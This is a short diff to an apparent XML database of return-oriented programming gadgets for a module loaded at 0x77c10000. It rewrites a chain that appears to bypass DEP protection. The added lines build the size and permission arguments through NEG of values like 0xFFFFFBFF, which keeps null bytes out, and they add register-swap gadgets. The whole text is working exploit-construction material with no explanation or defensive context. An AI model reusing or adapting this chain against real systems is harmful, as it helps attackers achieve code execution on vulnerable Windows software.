@@ -7,12 +7,21 @@
 	</compatibility>
 
 	<gadgets base="0x77c10000">
+		<gadget offset="0x0002b860">POP EAX # RETN</gadget>
+		<gadget value="0xFFFFFBFF">0xFFFFFBFF -> ebx</gadget>
+		<gadget offset="0x0000be18">NEG EAX # POP EBP # RETN</gadget>
+		<gadget value="junk">JUNK</gadget>
+		<gadget offset="0x0001362c">POP EBX # RETN</gadget>
+		<gadget offset="0x0004d9bb">Writable location</gadget>
+		<gadget offset="0x0001e071">XCHG EAX, EBX # ADD BYTE [EAX], AL # RETN</gadget>
+		<gadget offset="0x00040d13">POP EDX # RETN</gadget>
+		<gadget value="0xFFFFFFC0">0xFFFFFFC0-> edx</gadget>
+		<gadget offset="0x00048fbc">XCHG EAX, EDX # RETN</gadget>
+		<gadget offset="0x0000be18">NEG EAX # POP EBX # RETN</gadget>
+		<gadget value="junk">JUNK</gadget>
+		<gadget offset="0x00048fbc">XCHG EAX, EDX # RETN</gadget>
 		<gadget offset="0x0002ee15">POP EBP # RETN</gadget>
 		<gadget offset="0x0002ee15">skip 4 bytes</gadget>
-		<gadget offset="0x0003fa1c">POP EBX # RETN</gadget>
-		<gadget value="0x00000400">0x00000400-> ebx</gadget>
-		<gadget offset="0x00040d13">POP EDX # RETN</gadget>
-		<gadget value="0x00000040">0x00000040-> edx</gadget>
 		<gadget offset="0x0002eeef">POP ECX # RETN</gadget>
 		<gadget offset="0x0004d9bb">Writable location</gadget>
 		<gadget offset="0x0001a88c">POP EDI # RETN</gadget>
